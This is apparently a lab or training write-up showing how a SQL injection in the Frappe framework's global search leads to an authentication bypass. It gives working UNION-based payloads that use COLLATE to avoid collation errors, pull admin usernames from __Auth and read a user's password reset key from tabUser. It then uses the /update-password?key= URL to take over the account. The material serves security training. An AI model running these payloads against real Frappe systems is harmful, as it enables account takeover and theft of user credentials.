# Authentication Bypass (PW Reset)

Once we’ve obtained the initial SQL injection, we need to leverage it to escalate privileges and gain access into the application. 

The `PyMySQL` library does not allow multiple queries in 1 execution unless `multi=True` is set in the execute function, which is not applicable in this case. Hence, we have to stick with that specific `SELECT` query rather than stacking `INSERT` or `UPDATE` functionality.  

Frappe passwords are hashed with the PBK DF2 hash, making them rather difficult to crack. An easier route might be to highjack the password reset token. (Source: [https://discuss.frappe.io/t/how-to-see-password-on-database/85172/4](https://discuss.frappe.io/t/how-to-see-password-on-database/85172/4))

## Admin User Information

According to the [documentation](https://frappeframework.com/docs/user/en/basics/users-and-permissions#password-hashing) for Frappe, user credentials are stored in the table `__Auth` under the column names `name` and `password`. We’ll send a relevant request to extract the data, however, are met with the error message “Illegal mix of collations for operation UNION”

```sql
test_scope" UNION ALL SELECT 1,2,3,4,name FROM __Auth#
```

When [searching](https://stackoverflow.com/questions/20456152/mysql-error-illegal-mix-of-collations-for-operation-union) up the error message, we find that collation refers to the encoding style and MySQL requires columns to have the same type of collation when joining. If we knew what the collation style was, we could use the `COLLATE` command to force them to have join. We’ll query the `information_schema` table to get the collation style.

```sql
cmd=frappe.utils.global_search.web_search&text=offsec&scope=test_scope" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE table_name = "__Auth" #

Output: utf8mb4_unicode_ci

cmd=frappe.utils.global_search.web_search&text=offsec&scope=test_scope" UNION ALL SELECT 1,2,3,4,COLLATION_NAME FROM information_schema.columns WHERE table_name = "__global_search" 

Output: utf8mb4_general_ci
```

Given the difference, we’ll `COLLATE` our collation type to be the same as the global search table, `utf8mb4_general_ci`. 

```sql
test_scope" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#

Output: 
Administrator
zeljka.k@randomdomain.com
```

## Reset Password Key

We need to look for a potential injection point to find where the reset password keys are stored. Since Frappe uses a metadata-driven pattern, the database holds a lot of tables and would require a lot of time to go through. By sending a test user into the forgot password functionality, we can check the SQL logs to determine the functionality when handling a forgot password. This method is particularly useful for applications that aren’t well-documented publicly. 

From this statement, we can see that these tokens are stored in the `tabUser` table. 

```sql
select * from `tabUser` where `name` = 'testUser@mail.com' order by modified desc
```

Let’s get the column names from the `tabUser` table:

```sql
test_scope" UNION ALL SELECT 1,2,3,4,COLUMN_NAME FROM information_schema.columns WHERE table_name = "tabUser"#

(Important) Output: name, reset_password_key
```

Now, we’ll get the reset password key (note that similar to the `__Auth` table we’ll have to collate with `utf8mb4_general_ci`)

```sql
test_scope" UNION ALL SELECT 1,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser WHERE name = "zeljka.k@randomdomain.com" #
```

## Using password key

Checking our application for the `reset_password_key` functionality, we find this function that defines the recovery process. As such, we’ll just need to use the URL `/update-password?key=<key>` to gain access to the account. 

```python
def reset_password(self, send_email=False, password_expired=False):
		from frappe.utils import random_string, get_url

		key = random_string(32)
		self.db_set("reset_password_key", key)

		url = "/update-password?key=" + key
		if password_expired:
			url = "/update-password?key=" + key + '&password_expired=true'

		link = get_url(url)
		if send_email:
			self.password_reset_mail(link)

		return link
```

From here, it’s all quite straightforward — we’ll capture the requests for password reset and authentication with burp and simulate them programmatically. We’ve now attained an authenticated session to the web portal.